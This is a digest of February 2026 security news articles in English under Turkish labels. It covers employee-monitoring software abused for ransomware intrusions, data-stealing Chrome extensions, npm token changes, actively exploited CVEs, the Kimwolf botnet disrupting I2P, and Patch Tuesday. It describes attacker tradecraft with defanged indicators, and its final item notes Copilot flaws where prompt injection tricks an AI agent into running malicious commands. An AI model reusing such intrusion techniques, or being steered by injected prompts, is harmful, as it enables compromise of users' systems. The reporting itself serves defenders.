In late January and early February, the Huntress response team spotted two intrusions in which criminals chained Net Monitor for Employees Professional with remote monitoring and management (RMM) tool SimpleHelp, and then attempted to deploy ransomware on the victims' computers.

While the crims were ultimately unsuccessful, the security incidents highlight how miscreants love to use legitimate, commercial software for nefarious purposes because it makes it easier for them to hide inside enterprise IT environments.

"RMMs and employee monitoring tools blend in amongst legitimate signed binaries," Michael Tigges, senior security operations analyst at Huntress, told The Register, adding that "this is a rare case of the employee monitoring software being co-opted for subsequent access."

While neither of the victims' employers uses Net Monitor, repurposing this type of employee monitoring software falls into the "same category of RMM abuse," Tigges said. "Delineating which may be malicious and benign at first glance is exceedingly difficult. Adversaries know this as well."

The victims, we're told, were from different industry sectors, and "likely targets of opportunity rather than any specifically targeted group," he added.

This is a rare case of the employee monitoring software being co-opted for subsequent access

Tigges points out that "there are legitimate use cases for employee monitoring software - chiefly around data loss prevention."

This particular brand of bossware, however, does a whole lot more than passive screen monitoring. It can also establish remote shell connections and remotely execute commands on users' desktops. That makes it ideal for crims to use, even without modifying or infecting the installers.

"Threat actors leveraged this capability for hands-on-keyboard reconnaissance, additional tooling delivery, and deploying secondary remote access channels, effectively turning an employee monitoring tool into a fully functional RAT (remote access trojan)," Tigges and fellow threat hunters Anna Pham, Dray Agha, and Anton Ovrutsky wrote in a Wednesday blog.

As The Register previously reported, spying on workers is also bad for morale and doesn't inspire loyalty to the company, not to mention that employer-sanctioned RATs are creepy as all hell.

Here's what went down

In the first case that the Huntress team observed in late January, the attacker somehow installed Net Monitor for Employees on the victim's machine. Huntress doesn't know how the intruder gained initial access.

But once they had broken in, the criminals set to work manipulating user accounts via multiple net commands. This included attempting to identify valid usernames, reset passwords, and create new admin-user accounts on the host.

"As we kept pulling on investigative threads, we observed the 'Net Monitor for Employees' terminal pulling down a file via PowerShell named vhost.exe from the IP address of 160.191.182[.]41," the threat hunters wrote.

The executable turned out to be SimpleHelp, which the attacker then used in multiple attempts to tamper with Windows Defender. When this wasn't successful, the intruder tried to deploy multiple versions of Crazy ransomware linked to VoidCrypt.

In the second incident, which happened in early February, the attacker used a compromised third-party SSL VPN account to gain initial access to the victim's computer. Next, they connected to a domain controller using remote desktop protocol, launched a PowerShell session, and installed the Net Monitor agent, configuring the reverse connection to call back to an attacker-controlled console.

Net Monitor allows users to customize the service and process names, and the intruder took advantage of this to disguise the agent as Microsoft OneDrive, registering the service as OneDriveSvc, naming the process OneDriver.exe, and renaming the running binary to svchost.exe.

Ransomware crews add 'EDR killers' to their arsenal – and some aren't even malware

Then, the intruder installed SimpleHelp and configured it to monitor for keywords that would indicate cryptocurrency wallets, exchanges, blockchain explorers, and payment platforms. This, Huntress notes, indicates "the threat actor's financial motivation extends beyond ransomware to direct cryptocurrency theft."

The SimpleHelp agent also monitored for remote tool access keywords including RDP, AnyDesk, TeamViewer, and VNC.

Meanwhile, they used Net Monitor for Employees Professional to perform network reconnaissance on the compromised domain controller, probe internal network segments, and map out the network settings.

Huntress says shared infrastructure used in both cases, plus the reuse of the vhost.exe filename and overlapping IP addresses, "strongly suggest" a single attacker or group behind the two intrusions.

And to prevent becoming the next victim, turn on multi-factor authentication (MFA) on all remote access services and external-facing applications, and limit remote access to only those users and systems that require it to do their jobs.

The security analysts also suggest conducting regular audits of all third-party RMM tools and employee monitoring software, and monitoring for any unusual process execution chains. ®

[30] The Register - Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®

[1] The Hacker News - Malicious Chrome Extensions Caught Stealing Business Data, Emails, and Browsing History
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 16:55:00 +0530
Link: https://thehackernews.com/2026/02/malicious-chrome-extensions-caught.html

[TAM METİN - 1367 kelime]
Cybersecurity researchers have discovered a malicious Google Chrome extension that's designed to steal data associated with Meta Business Suite and Facebook Business Manager.

The extension, named CL Suite by @CLMasters (ID: jkphinfhmfkckkcnifhjiplhfoiefffl), is marketed as a way to scrape Meta Business Suite data, remove verification pop-ups, and generate two-factor authentication (2FA) codes. The extension has 33 users as of writing. It was first uploaded to the Chrome Web Store on March 1, 2025.

However, the browser add-on also exfiltrates TOTP codes for Facebook and Meta Business accounts, Business Manager contact lists, and analytics data to infrastructure controlled by the threat actor, Socket said.

"The extension requests broad access to meta.com and facebook.com and claims in its privacy policy that 2FA secrets and Business Manager data remain local," security researcher Kirill Boychenko said.

"In practice, the code transmits TOTP seeds and current one-time security codes, Meta Business 'People' CSV exports, and Business Manager analytics data to a backend at getauth[.]pro, with an option to forward the same payloads to a Telegram channel controlled by the threat actor."

By targeting users of Meta Business Suite and Facebook Business Manager, the threat actor behind the operation has leveraged the extension to conduct data collection and exfiltration without users' knowledge or consent.

While the extension does not have capabilities to steal password-related information, the attacker could obtain such information beforehand from other sources, such as infostealer logs or credential dumps, and then use the stolen codes to gain unauthorized access to victims' accounts.

The full scope of the malicious add-on's capabilities is listed below -

Steal TOTP seed (a unique, alphanumeric code that's used to generate time-based one-time passwords) and 2FA code

Target Business Manager "People" view by navigating to facebook[.]com and meta[.]com and build a CSV file with names, email addresses, roles and permissions, and their status and access details.

Enumerate Business Manager-level entities and their linked assets and build a CSV file of Business Manager IDs and names, attached ad accounts, connected pages and assets, and billing and payment configuration details.

Socket warned that despite the low number of installs, the extension gives the threat actor enough information to identify high-value targets and mount follow-on attacks.

"CL Suite by @CLMasters shows how a narrow browser extension can repackage data scraping as a 'tool' for Meta Business Suite and Facebook Business Manager," Boychenko said.

"Its people extraction, Business Manager analytics, popup suppression, and in-browser 2FA generation are not neutral productivity features, they are purpose-built scrapers for high-value Meta surfaces that collect contact lists, access metadata, and 2FA material straight from authenticated pages."

Chrome Extensions Hijack VKontakte Accounts

The disclosure comes as Koi Security found that about 500,000 VKontakte users have had their accounts silently hijacked through Chrome extensions masquerading as VK customization tools. The large-scale campaign has been codenamed VK Styles.

The malware embedded in the extensions is designed to engage in active account manipulation by automatically subscribing users to the attacker's VK groups, resetting account settings every 30 days to override user preferences, manipulating Cross-Site Request Forgery (CSRF) tokens to bypass VK's security protections, and maintaining persistent control.

The activity has been traced to a threat actor operating under the GitHub username 2vk, who has relied on VK's own social network to distribute malicious payloads and build a follower base through forced subscriptions. The names of the extensions are listed below -

VK Styles - Themes for vk.com (ID: ceibjdigmfbbgcpkkdpmjokkokklodmc)

VK Music - audio saver (ID: mflibpdjoodmoppignjhciadahapkoch)

Music Downloader - VKsaver (ID: lgakkahjfibfgmacigibnhcgepajgfdb)

vksaver - music saver vk (ID: bndkfmmbidllaiccmpnbdonijmicaafn)

VKfeed - Download Music and Video from VK (ID: pcdgkgbadeggbnodegejccjffnoakcoh)

One of the defining traits of the campaign is the use of a VK profile's ("vk[.]com/m0nda") HTML metadata tags as a dead drop resolver to conceal the next-stage payload URLs and, therefore, evade detection. The next-stage payload is hosted in a public repository named "-" that's associated with 2vk. Present in the payload is obfuscated JavaScript that's injected into every VK page the victim visits.

The repository is still accessible as of writing, with the file, simply named "C," receiving a total of 17 commits between June 2025 and January 2026, as the operator refined and added new functionality.

"Each commit shows deliberate refinement," security researcher Ariel Cohen said. "This isn't sloppy malware - it's a maintained software project with version control, testing, and iterative improvements."

VK Styles has primarily affected Russian-speaking users, who are VK's main demographic, as well as users across Eastern Europe, Central Asia, and Russian diaspora communities globally. The campaign is assessed to be active since at least June 22, 2025, when the initial version of the payload was pushed to the "-" repository.

Fake AI Chrome Extensions Steal Credentials, Emails

The findings also coincide with the discovery of another coordinated campaign dubbed AiFrame, where a cluster of 32 browser add-ons advertised as artificial intelligence (AI) assistants for summarization, chat, writing, and Gmail assistance are being used to siphon sensitive data. These extensions have been collectively installed by more than 260,000 users.

"While these tools appear legitimate on the surface, they hide a dangerous architecture: instead of implementing core functionality locally, they embed remote, server-controlled interfaces inside extension-controlled surfaces and act as privileged proxies, granting remote infrastructure access to sensitive browser capabilities," LayerX researcher Natalie Zargarov said.

Once installed, these extensions render a full-screen iframe overlay pointing to a remote domain ("claude.tapnetic[.]pro"), allowing the attackers to remotely introduce new capabilities without requiring a Chrome Web Store update. When instructed by the iframe, the add-ons query the active browser tab and invoke a content script to extract readable article content using Mozilla's Readability library.

The malware also supports the capability to start speech recognition and exfiltrate the resulting transcript to the remote page. What's more, a smaller set of the extensions contain functionality to specifically target Gmail by reading visible email content directly from the document object model (DOM) when a victim visits mail.google[.]com.

"When Gmail-related features such as AI-assisted replies or summaries are invoked, the extracted email content is passed into the extension's logic and transmitted to third-party backend infrastructure controlled by the extension operator," LayerX said. "As a result, email message text and related contextual data may be sent off-device, outside of Gmail’s security boundary, to remote servers."

287 Chrome Extensions Exfiltrate Browsing History

The developments show how web browser extensions are increasingly being abused by bad actors to harvest and exfiltrate sensitive data by passing them off as seemingly legitimate tools and utilities.

A report published by Q Continuum last week found a huge collection of 287 Chrome extensions that exfiltrate browsing history to data brokers. These extensions have 37.4 million installations, representing roughly 1% of the global Chrome userbase.

"It was shown in the past that Chrome extensions are used to exfiltrate user browser history that is then collected by data brokers such as Similarweb and Alexa," the researcher said.

Given the risks involved, users are recommended to adopt a minimalist approach by only installing necessary, well-reviewed tools from official stores. It's also essential to periodically audit installed extensions for any signs of malicious behavior or excessive permission requests.

Other ways that users and organizations can ensure greater security include using separate browser profiles for sensitive tasks and implementing extension allowlisting to block those that are malicious or non-compliant.

[2] The Hacker News - npm’s Update to Harden Their Supply Chain, and Points to Consider
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 16:15:00 +0530
Link: https://thehackernews.com/2026/02/npms-update-to-harden-their-supply.html

[TAM METİN - 833 kelime]
In December 2025, in response to the Sha1-Hulud incident, npm completed a major authentication overhaul intended to reduce supply-chain attacks. While the overhaul is a solid step forward, the changes don’t make npm projects immune from supply-chain attacks. npm is still susceptible to malware attacks – here’s what you need to know for a safer Node community.

Let’s start with the original problem

Historically, npm relied on classic tokens: long-lived, broadly scoped credentials that could persist indefinitely. If stolen, attackers could directly publish malicious versions to the author’s packages (no publicly verifiable source code needed). This made npm a prime vector for supply-chain attacks. Over time, numerous real-world incidents demonstrated this point. Shai-Hulud, Sha1-Hulud, and chalk/debug are examples of recent, notable attacks.

To address this, npm made the following changes:

npm revoked all classic tokens and defaulted to session-based tokens instead. The npm team also improved token management. Interactive workflows now use short-lived session tokens (typically two hours) obtained via npm login, which defaults to MFA for publishing.

The npm team also encourages OIDC Trusted Publishing, in which CI systems obtain short-lived, per-run credentials rather than storing secrets at rest.

In combination, these practices improve security. They ensure credentials expire quickly and require a second factor during sensitive operations.

Two important issues remain

First, people need to remember that the original attack on tools like ChalkJS was a successful MFA phishing attempt on npm’s console. If you look at the original email attached below, you can see it was an MFA-focused phishing email (nothing like trying to do the right thing and still getting burned). The campaign tricked the maintainer into sharing both the user login and one-time password. This means in the future, similar emails could get short-lived tokens, which still give attackers enough time to upload malware (since that would only take minutes).

Second, MFA on publish is optional. Developers can still create 90-day tokens with MFA bypass enabled in the console, which are extremely similar to the classic tokens from before.

These tokens allow you to read and write to a token author’s maintained packages. This means that if bad actors gain access to a maintainer’s console with these token settings, they can publish new, malicious packages (and versions) on that author’s behalf. This circles us back to the original issue with npm before they adjusted their credential policies.

To be clear, more developers using MFA on publish is good news, and future attacks should be fewer and smaller. However, making OIDC and MFA on-publish optional still leaves the core issue unresolved.

In conclusion, if (1) MFA phishing attempts to npm’s console still work and (2) access to the console equals access to publish new packages/versions, then developers need to be aware of the supply-chain risks that still exist.

In the spirit of open source security, here are three recommendations that we hope GitHub and npm will consider in the future.

Ideally, they continue to push for the ubiquity of OIDC in the long term. OIDC is very hard to compromise and would almost completely erase the issues surrounding supply-chain attacks.

More realistically, enforcing MFA for local package uploads (either via an email code or a one-time password) would further reduce the blast radius of worms like Shai-Hulud. In other words, it would be an improvement to not allow custom tokens that bypass MFA.

At a minimum, it would be nice to add metadata to package releases, so developers can take precautions and avoid packages (or maintainers) who do not take supply chain security measures.

In short, npm has taken an important step forward by eliminating permanent tokens and improving defaults. Until short-lived, identity-bound credentials become the norm — and MFA bypass is no longer required for automation — supply-chain risk from compromised build systems remains materially present.

This entire time, we’ve been talking about supply-chain attacks by uploading packages to npm on a maintainer’s behalf. If we could build every npm package from verifiable upstream source code rather than downloading the artifact from npm, we’d be better off. That’s exactly what Chainguard does for its customers with Chainguard Libraries for JavaScript.

We’ve looked at the public database for compromised packages across npm and discovered that for 98.5% of malicious packages, the malware was not present in the upstream source code (just the published artifact). This means an approach of building from source would reduce your attack surface by some 98.5%, based on past data, because Chainguard’s JavaScript repository would never publish the malicious versions available on npm.

In an ideal world, customers are most secure when they use Chainguard Libraries and apply the recommendations above. Per the “Swiss cheese model of security,” all of these features are layers of additive security measures, and companies would be best off using a combination of them.

[3] The Hacker News - Researchers Observe In-the-Wild Exploitation of BeyondTrust CVSS 9.9 Vulnerability
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 14:04:00 +0530
Link: https://thehackernews.com/2026/02/researchers-observe-in-wild.html

[TAM METİN - 864 kelime]
Threat actors have started to exploit a recently disclosed critical security flaw impacting BeyondTrust Remote Support (RS) and Privileged Remote Access (PRA) products, according to watchTowr.

"Overnight we observed first in-the-wild exploitation of BeyondTrust across our global sensors," Ryan Dewhurst, head of threat intelligence at watchTowr, said in a post on X. "Attackers are abusing get_portal_info to extract the x-ns-company value before establishing a WebSocket channel."

The vulnerability in question is CVE-2026-1731 (CVS score: 9.9), which could allow an unauthenticated attacker to achieve remote code execution by sending specially crafted requests.

BeyondTrust noted last week that successful exploitation of the shortcoming could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user, resulting in unauthorized access, data exfiltration, and service disruption.

It has been patched in the following versions -

Remote Support - Patch BT26-02-RS, 25.3.2 and later

Privileged Remote Access - Patch BT26-02-PRA, 25.1.1 and later

The use of CVE-2026-1731 demonstrates how quickly threat actors can weaponize new vulnerabilities, significantly shrinking the window for defenders to patch critical systems.

CISA Adds 4 Flaws to KEV Catalog

The development comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added four vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The list of vulnerabilities is as follows -

CVE-2026-20700 (CVSS score: 7.8) - An improper restriction of operations within the bounds of a memory buffer vulnerability in Apple iOS, macOS, tvOS, watchOS, and visionOS that could allow an attacker with memory write capability to execute arbitrary code.

CVE-2025-15556 (CVSS score: 7.7) - A download of code without an integrity check vulnerability in Notepad++ that could allow an attacker to intercept or redirect update traffic to download and execute an attacker-controlled installer and lead to arbitrary code execution with the privileges of the user.

CVE-2025-40536 (CVSS score: 8.1) - A security control bypass vulnerability in SolarWinds Web Help Desk that could allow an unauthenticated attacker to gain access to certain restricted functionality.

CVE-2024-43468 (CVSS score: 9.8) - An SQL injection vulnerability in Microsoft Configuration Manager that could allow an unauthenticated attacker to execute commands on the server and/or underlying database by sending specially crafted requests.

It's worth noting that CVE-2024-43468 was patched by Microsoft in October 2024 as part of its Patch Tuesday updates. It's currently unclear how this vulnerability is being exploited in real-world attacks. Nor is there any information about the identity of the threat actors exploiting the flaw and the scale of such efforts.

The addition of CVE-2024-43468 to the KEV catalog follows a recent report from Microsoft about a multi‑stage intrusion that involved the threat actors exploiting internet‑exposed SolarWinds Web Help Desk (WHD) instances to obtain initial access and move laterally across the organization's network to other high-value assets.

However, the Windows maker said it's not evident if the attacks exploited CVE-2025-40551, CVE-2025-40536, or CVE-2025-26399, since attacks occurred in December 2025 and on machines vulnerable to both the old and new sets of vulnerabilities.

As for CVE-2026-20700, Apple acknowledged that the shortcoming may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26, raising the possibility that it was leveraged to deliver commercial spyware. It was fixed by the tech giant earlier this week.

Lastly, the exploitation of CVE-2025-15556 has been attributed by Rapid7 to a China-linked state-sponsored threat actor called Lotus Blossom (aka Billbug, Bronze Elgin, G0030, Lotus Panda, Raspberry Typhoon, Spring Dragon, and Thrip). It's known to be active since at least 2009.

The targeted attacks have been found to deliver a previously undocumented backdoor called Chrysalis. While the supply chain attack was fully plugged on December 2, 2025, the compromise of the Notepad++ update pipeline is estimated to have spanned nearly five months between June and October 2025.

The DomainTools Investigations (DTI) team described the incident as precise and a "quiet, methodical intrusion" that points to a covert intelligence-gathering mission designed to keep operational noise as low as possible. It also characterized the threat actor as having a penchant for long dwell times and multi-year campaigns.

An important aspect of the campaign is that the Notepad++ source code was left intact, instead relying on trojanized installers to deliver the malicious payloads. This, in turn, allowed the attackers to bypass source-code reviews and integrity checks, effectively enabling them to stay undetected for extended periods, DTI added.

"From their foothold inside the update infrastructure, the attackers did not indiscriminately push malicious code to the global Notepad++ user base," it said. "Instead, they exercised restraint, selectively diverting update traffic for a narrow set of targets, organizations, and individuals whose positions, access, or technical roles made them strategically valuable."

"By abusing a legitimate update mechanism relied upon specifically by developers and administrators, they transformed routine maintenance into a covert entry point for high-value access. The campaign reflects continuity in purpose, a sustained focus on regional strategic intelligence, executed with more sophisticated, more subtle, and harder-to-detect methods than in prior iterations."

In light of active exploitation of these vulnerabilities, Federal Civilian Executive Branch (FCEB) agencies have until February 15, 2026, to address CVE-2025-40536, and till March 5, 2026, to fix the remaining three.

[TAM METİN - 434 kelime]
CISA ordered U.S. government agencies on Thursday to secure their systems against a critical Microsoft Configuration Manager vulnerability patched in October 2024 and now exploited in attacks.

Microsoft Configuration Manager (also known as ConfigMgr and formerly System Center Configuration Manager, or SCCM) is an IT administration tool for managing large groups of Windows servers and workstations.

Tracked as CVE-2024-43468 and reported by offensive security company Synacktiv, this SQL injection vulnerability allows remote attackers with no privileges to gain code execution and run arbitrary commands with the highest level of privileges on the server and/or the underlying Microsoft Configuration Manager site database.

"An unauthenticated attacker could exploit this vulnerability by sending specially crafted requests to the target environment which are processed in an unsafe manner enabling the attacker to execute commands on the server and/or underlying database," Microsoft explained when it patched the flaw in October 2024.

At the time, Microsoft tagged it as "Exploitation Less Likely," saying that "an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product."

However, Synacktiv shared proof-of-concept exploitation code for CVE-2024-43468 on November 26th, 2024, almost two months after Microsoft released security updates to mitigate this remote code execution vulnerability.

While Microsoft has not yet updated its advisory with additional information, CISA has now flagged CVE-2024-43468 as actively exploited in the wild and has ordered Federal Civilian Executive Branch (FCEB) agencies to patch their systems by March 5th, as mandated by the Binding Operational Directive (BOD) 22-01.

"These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise," the U.S. cybersecurity agency warned.

"Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable."

Even though BOD 22-01 applies only to federal agencies, CISA encouraged all network defenders, including those in the private sector, to secure their devices against ongoing CVE-2024-43468 attacks as soon as possible.

[5] BleepingComputer - Microsoft fixes bug that blocked Google Chrome from launching
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 04:31:01 -0500
Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-family-safety-bug-that-blocks-google-chrome-from-launching/

[TAM METİN - 484 kelime]
Microsoft has fixed a known issue causing its Family Safety parental control service to block Windows users from launching Google Chrome and other web browsers.

Family Safety helps parents monitor their children's activity and provides screen time management, app controls, communication monitoring, content filtering, location tracking, and activity reports.

Microsoft acknowledged the bug in late June 2025 after widespread reports that users were unable to launch Google Chrome on their PCs or experienced the web browser randomly crashing on devices running Windows 10 22H2 and Windows 11 22H2 or later.

As explained at the time, the issue is caused by Family Safety's web filtering tool, which prompts children to ask their parents for approval to use other browsers. However, the bug also causes Family Safety to block new versions of previously approved web browsers, inadvertently preventing them from launching or causing them to shut down unexpectedly.

"The blocking behavior continues to work, however, when a browser updates to a new version, the latest version of the browser cannot be blocked until we add it to the block list. Microsoft is currently adding the latest versions of Chrome and other browsers to the block list," the company notes on the Windows release health dashboard.

"As Microsoft continues to update the block list, we've received reports of a new issue affecting Google Chrome and some browsers. When children try to open these browsers, they shut down unexpectedly."

Service‑side fix pushed in early February

This week, Microsoft confirmed that it addressed the issue with a service‑side fix earlier this month, nearly eight months after first receiving reports of web browsers shutting down unexpectedly.

Affected users are advised to connect their devices to the Internet to receive the fix, which should address the bug and prevent similar problems in the future.

"This issue has been resolved through a service‑side fix. The rollout began early February 2026 and should reach all affected devices over the coming weeks," Microsoft said. "If your device presented this symptom, please let it connect to the internet to receive the resolution. No other action is required."

Those who can't get online to receive the fix are advised to turn on the 'Activity reporting' feature under Windows settings in Microsoft Family Safety, which will allow parents to receive approval requests as expected and allowlist newer browser versions.

[6] BleepingComputer - Russia tries to block WhatsApp, Telegram in communication blockade
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 17:57:54 -0500
Link: https://www.bleepingcomputer.com/news/security/russia-tries-to-block-whatsapp-telegram-in-communication-blockade/

[TAM METİN - 436 kelime]
The Russian government is trying to block WhatsApp in the country as its crackdown on communication platforms outside its control intensifies.

WhatsApp announced the action against it on X, calling it “a backwards step” that “can only lead to less safety for people in Russia.”

WhatsApp assured its Russian users that it will continue doing everything it can to keep them connected.

According to Russian media, the country’s internet watchdog, Roskomnadzor, had recently excluded the domains whatsapp.com and web.whatsapp.com from the National Domain Name System, citing the official explanation of countering crime and fraud.

In practice, excluding the domains from domestic DNS routing made WhatsApp services accessible only to users who use VPN tools or external resolvers.

However, more aggressive measures are reportedly now in place, with the latest attempt to fully block WhatsApp in Russia. The instant messenger's parent company, Meta, has been designated as an “extremist” entity in Russia since 2022.

WhatsApp saw its first restrictions in the country in August 2025, when Roskomnadzor began throttling voice and video calls. In October 2025, the authorities attempted to block new user registrations.

Presidential press secretary Dmitry Peskov reportedly stated that the authorities are open to allowing WhatsApp to resume operations in the country, provided that Meta complies with local legislation.

WhatsApp blocks came shortly after similar action was taken against Telegram, which was reportedly aggressively throttled earlier this week in Russia.

Telegram’s founder, Pavel Durov, responded to the situation by stating that Russia is trying to encourage its citizens to use the Kremlin-controlled MAX messenger app.

MAX is a controversial communications platform developed by VK, which became mandatory on all electronic devices sold in the country since September 2025.

Although MAX is promoted as a secure app that safeguards national communications from foreign surveillance, several independent reviewers have raised concerns about encryption weaknesses, government access, and extensive data-collection risks.

For now, users in Russia may be able to continue accessing their messengers of choice by using VPN tools, though those are not immune to the government’s crackdown either.

[7] Krebs on Security - Kimwolf Botnet Swamps Anonymity Network I2P
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 16:08:11 +0000
Link: https://krebsonsecurity.com/2026/02/kimwolf-botnet-swamps-anonymity-network-i2p/

[TAM METİN - 831 kelime]
For the past week, the massive “Internet of Things” (IoT) botnet known as Kimwolf has been disrupting The Invisible Internet Project (I2P), a decentralized, encrypted communications network designed to anonymize and secure online communications. I2P users started reporting disruptions in the network around the same time the Kimwolf botmasters began relying on it to evade takedown attempts against the botnet’s control servers.

Kimwolf is a botnet that surfaced in late 2025 and quickly infected millions of systems, turning poorly secured IoT devices like TV streaming boxes, digital picture frames and routers into relays for malicious traffic and abnormally large distributed denial-of-service (DDoS) attacks.

I2P is a decentralized, privacy-focused network that allows people to communicate and share information anonymously.

“It works by routing data through multiple encrypted layers across volunteer-operated nodes, hiding both the sender’s and receiver’s locations,” the I2P website explains. “The result is a secure, censorship-resistant network designed for private websites, messaging, and data sharing.”

On February 3, I2P users began complaining on the organization’s GitHub page about tens of thousands of routers suddenly overwhelming the network, preventing existing users from communicating with legitimate nodes. Users reported a rapidly increasing number of new routers joining the network that were unable to transmit data, and that the mass influx of new systems had overwhelmed the network to the point where users could no longer connect.

I2P users complaining about service disruptions from a rapidly increasing number of routers suddenly swamping the network.

When one I2P user asked whether the network was under attack, another user replied, “Looks like it. My physical router freezes when the number of connections exceeds 60,000.”

A graph shared by I2P developers showing a marked drop in successful connections on the I2P network around the time the Kimwolf botnet started trying to use the network for fallback communications.

The same day that I2P users began noticing the outages, the individuals in control of Kimwolf posted to their Discord channel that they had accidentally disrupted I2P after attempting to join 700,000 Kimwolf-infected bots as nodes on the network.

The Kimwolf botmaster openly discusses what they are doing with the botnet in a Discord channel with my name on it.

Although Kimwolf is known as a potent weapon for launching DDoS attacks, the outages caused this week by some portion of the botnet attempting to join I2P are what’s known as a “Sybil attack,” a threat in peer-to-peer networks where a single entity can disrupt the system by creating, controlling, and operating a large number of fake, pseudonymous identities.

Indeed, the number of Kimwolf-infected routers that tried to join I2P this past week was many times the network’s normal size. I2P’s Wikipedia page says the network consists of roughly 55,000 computers distributed throughout the world, with each participant acting as both a router (to relay traffic) and a client.

However, Lance James, founder of the New York City based cybersecurity consultancy Unit 221B and the original founder of I2P, told KrebsOnSecurity the entire I2P network now consists of between 15,000 and 20,000 devices on any given day.

An I2P user posted this graph on Feb. 10, showing tens of thousands of routers — mostly from the United States — suddenly attempting to join the network.

Benjamin Brundage is founder of Synthient, a startup that tracks proxy services and was the first to document Kimwolf’s unique spreading techniques. Brundage said the Kimwolf operator(s) have been trying to build a command and control network that can’t easily be taken down by security companies and network operators that are working together to combat the spread of the botnet.

Brundage said the people in control of Kimwolf have been experimenting with using I2P and a similar anonymity network — Tor — as a backup command and control network, although there have been no reports of widespread disruptions in the Tor network recently.

“I don’t think their goal is to take I2P down,” he said. “It’s more they’re looking for an alternative to keep the botnet stable in the face of takedown attempts.”

The Kimwolf botnet created challenges for Cloudflare late last year when it began instructing millions of infected devices to use Cloudflare’s domain name system (DNS) settings, causing control domains associated with Kimwolf to repeatedly usurp Amazon, Apple, Google and Microsoft in Cloudflare’s public ranking of the most frequently requested websites.

James said the I2P network is still operating at about half of its normal capacity, and that a new release is rolling out which should bring some stability improvements over the next week for users.

Meanwhile, Brundage said the good news is Kimwolf’s overlords appear to have quite recently alienated some of their more competent developers and operators, leading to a rookie mistake this past week that caused the botnet’s overall numbers to drop by more than 600,000 infected systems.

“It seems like they’re just testing stuff, like running experiments in production,” he said. “But the botnet’s numbers are dropping significantly now, and they don’t seem to know what they’re doing.”

[8] Krebs on Security - Patch Tuesday, February 2026 Edition
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 515 kelime]
Microsoft today released updates to fix more than 50 security holes in its Windows operating systems and other software, including patches for a whopping six “zero-day” vulnerabilities that attackers are already exploiting in the wild.

Zero-day #1 this month is CVE-2026-21510, a security feature bypass vulnerability in Windows Shell wherein a single click on a malicious link can quietly bypass Windows protections and run attacker-controlled content without warning or consent dialogs. CVE-2026-21510 affects all currently supported versions of Windows.

The zero-day flaw CVE-2026-21513 is a security bypass bug targeting MSHTML, the proprietary engine of the default Web browser in Windows. CVE-2026-21514 is a related security feature bypass in Microsoft Word.

The zero-day CVE-2026-21533 allows local attackers to elevate their user privileges to “SYSTEM” level access in Windows Remote Desktop Services. CVE-2026-21519 is a zero-day elevation of privilege flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Microsoft fixed a different zero-day in DWM just last month.

The sixth zero-day is CVE-2026-21525, a potentially disruptive denial-of-service vulnerability in the Windows Remote Access Connection Manager, the service responsible for maintaining VPN connections to corporate networks.

Chris Goettl at Ivanti reminds us Microsoft has issued several out-of-band security updates since January’s Patch Tuesday. On January 17, Microsoft pushed a fix that resolved a credential prompt failure when attempting remote desktop or remote application connections. On January 26, Microsoft patched a zero-day security feature bypass vulnerability (CVE-2026-21509) in Microsoft Office.

Kev Breen at Immersive notes that this month’s Patch Tuesday includes several fixes for remote code execution vulnerabilities affecting GitHub Copilot and multiple integrated development environments (IDEs), including VS Code, Visual Studio, and JetBrains products. The relevant CVEs are CVE-2026-21516, CVE-2026-21523, and CVE-2026-21256.

Breen said the AI vulnerabilities Microsoft patched this month stem from a command injection flaw that can be triggered through prompt injection, or tricking the AI agent into doing something it shouldn’t — like executing malicious code or commands.

